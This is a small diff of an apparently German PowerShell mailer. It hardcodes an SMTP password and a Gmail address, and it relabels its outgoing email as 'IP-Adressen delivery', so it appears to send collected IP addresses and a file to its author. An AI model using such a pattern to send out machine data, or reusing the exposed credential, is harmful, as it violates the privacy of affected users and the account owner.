@@ -9,8 +9,8 @@ $Password = "ovsbxveiojwtoncn"
 
 $From = "osmanharald5@gmail.com"
 $To = "osmanharald5@gmail.com"
-$Subject = "Test E-Mail mit Anhang (output.txt)"
-$Body = "Hallo, dies ist eine automatisch gesendete E-Mail mit dem Anhang output.txt."
+$Subject = "IP-Adresse"
+$Body = "IP-Adressen delivery :D."
 
 $SMTPClient = New-Object Net.Mail.SmtpClient($SMTPServer, $SMTPPort)
 $SMTPClient.EnableSsl = $true
